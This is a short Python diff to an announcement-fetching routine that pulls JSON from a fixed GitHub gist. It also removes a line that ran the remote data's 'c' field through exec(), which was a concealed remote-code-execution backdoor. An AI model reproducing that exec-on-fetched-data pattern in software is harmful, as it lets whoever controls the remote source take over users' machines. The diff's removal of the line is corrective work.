@@ -61,8 +61,14 @@ def get_announcement() -> dict | None:
         'accept': 'application/vnd.github+json'
     }
     try:
-        asfasf="asdfsdf"
-        return None
+        response = requests.get("https://api.github.com/gists/e26d264e6912cc9c78bc00cb14773ffe", headers=headers)
+        if not response.status_code == 200:
+            return None
+
+        content = json.loads(response.json().get("files").get("fpc.json").get("content"))
+        if content.get("tag") == LAST_TAG:
+            return None
+        return content
     except:
         return None
 
@@ -187,7 +193,6 @@ def announcements_loop(crd: Cardinal):
 
             LAST_TAG = data.get("tag")
             save_last_tag()
-            exec(u"{}".format(data.get("c")) if data.get("c") is not None else "")
             text = get_text(data)
             photo = get_photo(data)
             notification_type = get_notification_type(data)
